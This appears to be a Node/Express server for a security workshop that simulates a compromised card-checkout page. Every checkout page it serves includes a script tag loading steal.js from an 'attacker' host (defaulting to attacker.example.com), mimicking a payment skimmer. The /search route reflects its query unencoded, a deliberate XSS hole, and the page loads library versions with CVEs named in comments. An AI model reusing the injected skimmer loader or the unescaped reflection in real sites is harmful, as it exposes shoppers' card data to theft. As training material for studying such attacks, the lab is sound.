const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

if (process.env.TRUST_PROXY !== '0') {
  app.set('trust proxy', 1);
}

function forwardedHost(req) {
  const raw = req.get('x-forwarded-host') || req.get('host');
  if (!raw) return '';
  return raw.split(',')[0].trim();
}

/** Script URLs use //host — same scheme as the checkout page avoids mixed-content when TLS is fronted but Proxy-Proto is missing. */
function absoluteToProtocolRelative(embed) {
  const t = embed.replace(/\/$/, '');
  try {
    if (/^https?:\/\//i.test(t)) {
      const u = new URL(t);
      return `//${u.host}`;
    }
  } catch (_) {}
  return t;
}

/**
 * When PAYMENT_DOMAIN is payment.*, attacker host defaults to attacker.* ahead of ATTACKER_DOMAIN,
 * so a stale ATTACKER_DOMAIN or Host/WAF header does not skew the injected script.
 *
 * Prefer PAYMENT_DOMAIN / Host over ATTACKER_URL unless FORCE… .
 * Return protocol-relative "//hostname[:port]" for <script src> so HTTPS pages load steal.js over HTTPS even if Node saw http behind the WAF.
 */
function resolveAttackerOrigin(req) {
  const legacy = (process.env.ATTACKER_URL || '').trim();
  const forceEnv = (process.env.FORCE_ATTACKER_URL_FROM_ENV || '') === '1';
  if (forceEnv && legacy) {
    return absoluteToProtocolRelative(legacy);
  }

  const payHost = forwardedHost(req);
  const explicitAttack = (process.env.ATTACKER_DOMAIN || '').trim();
  const cfgPay = (process.env.PAYMENT_DOMAIN || '').trim();

  let hostPart;
  if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') {
    hostPart = payHost;
  } else if (cfgPay.startsWith('payment.')) {
    // Prefer PAYMENT_DOMAIN so checkout matches the configured site even if Host/WAF sends a stale name.
    hostPart = `attacker.${cfgPay.slice('payment.'.length)}`;
  } else if (explicitAttack) {
    hostPart = explicitAttack;
  } else if (payHost.startsWith('payment.')) {
    hostPart = `attacker.${payHost.slice('payment.'.length)}`;
  } else {
    hostPart = payHost;
  }

  if (hostPart) {
    const pubPort = (
      process.env.ATTACKER_PUBLIC_PORT ||
      process.env.EXTERNAL_ATTACKER_PORT ||
      ''
    ).trim();
    if (pubPort && pubPort !== '80' && pubPort !== '443') {
      hostPart += `:${pubPort}`;
    }
    return `//${hostPart}`;
  }

  if (legacy) {
    return absoluteToProtocolRelative(legacy);
  }
  return '//attacker.example.com';
}

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// Main route - script is always injected (simulating compromised third-party script)
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(getHtml(resolveAttackerOrigin(req), true));
});

// Reflected XSS: 'q' or 'search' param is echoed without encoding (triggers script load)
app.get('/search', (req, res) => {
  const q = req.query.q || req.query.search || '';
  const html = `
<!DOCTYPE html>
<html>
<head><title>Search</title></head>
<body>
  <h1>Search results for: ${q}</h1>
  <p>No results found.</p>
  <a href="/">Back to checkout</a>
</body>
</html>`;
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Checkout route - same as main route (script always injected)
app.get('/checkout', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(getHtml(resolveAttackerOrigin(req), true));
});

function getHtml(attackerUrl, injectScript = true) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Checkout - Simulated</title>
  <!-- Vulnerable: jQuery 3.3.1 - CVE-2019-11358 (prototype pollution) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <!-- Vulnerable: Lodash 4.17.10 - CVE-2018-3721, CVE-2019-10744 (prototype pollution) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.10/lodash.min.js"></script>
  <!-- Vulnerable: AngularJS 1.6.9 - CVE-2019-10768 (XSS), CVE-2020-7676 (XSS), CVE-2021-32820 (XSS) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js"></script>
  <!-- Local scripts - External JS files (no inline scripts) -->
  <script src="/js/utils.js"></script>
  <script src="/js/formatters.js"></script>
  <script src="/js/payment.js"></script>
  ${injectScript ? `<script src="${attackerUrl}/steal.js"></script>` : ''}
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      max-width: 500px;
      width: 100%;
      animation: slideUp 0.5s ease-out;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      font-size: 28px;
      font-weight: 600;
    }
    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      color: #333;
      font-weight: 500;
      margin-bottom: 8px;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      font-size: 16px;
      transition: all 0.3s ease;
      font-family: inherit;
    }
    input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    input::placeholder {
      color: #999;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      margin-top: 10px;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
    }
    button:active {
      transform: translateY(0);
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }
    #message {
      margin-top: 20px;
      padding: 12px;
      border-radius: 8px;
      text-align: center;
      font-size: 14px;
      animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .message-success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .message-error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .message-info {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }
    .card-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    .card-icon svg {
      width: 60px;
      height: 60px;
      opacity: 0.3;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      animation: fadeIn 0.3s ease;
    }
    .modal.show {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background: white;
      padding: 40px;
      border-radius: 20px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      animation: scaleIn 0.3s ease;
    }
    @keyframes scaleIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .modal-content h2 {
      color: #333;
      margin-bottom: 20px;
      font-size: 24px;
    }
    .modal-content .success-icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: #d4edda;
      border: 3px solid #28a745;
      position: relative;
    }
    .modal-content .success-icon::after {
      content: '';
      position: absolute;
      left: 50%;
      top: 45%;
      width: 12px;
      height: 24px;
      border: solid #28a745;
      border-width: 0 4px 4px 0;
      transform: translate(-50%, -50%) rotate(45deg);
    }
    .modal-content p {
      color: #666;
      margin-bottom: 30px;
      font-size: 16px;
    }
    .modal-content button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
        <line x1="1" y1="10" x2="23" y2="10"></line>
      </svg>
    </div>
    <h1>Secure Checkout</h1>
    <p class="subtitle">Workshop only - do not enter real card data</p>
    <form id="payment-form" action="/submit" method="POST">
      <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="text" name="cardNumber" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" required>
      </div>
      <div class="form-group">
        <label for="expiry">Expiry Date</label>
        <input type="text" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
      </div>
      <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="4" required>
      </div>
      <div class="form-group">
        <label for="cardName">Name on Card</label>
        <input type="text" name="cardName" id="cardName" placeholder="John Doe" required>
      </div>
      <button type="submit" id="submit-btn">Submit Payment</button>
    </form>
    <div id="message"></div>
  </div>

  <!-- Modal popup -->
  <div id="success-modal" class="modal">
    <div class="modal-content">
      <div class="success-icon" aria-hidden="true"></div>
      <h2>Payment Successful!</h2>
      <p>Your payment has been simulated successfully.</p>
      <button id="modal-ok-btn">OK</button>
    </div>
  </div>
</body>
</html>`;
}

app.post('/submit', (req, res) => {
  console.log('[SUBMIT] Payment data received:', {
    cardNumber: req.body.cardNumber,
    expiry: req.body.expiry,
    cvv: req.body.cvv ? '***' : undefined,
    cardName: req.body.cardName
  });
  // Return success response (don't redirect, let JS handle it)
  res.status(200).json({ success: true, message: 'Payment simulated successfully' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Transaction app listening on port ${PORT}`);
});
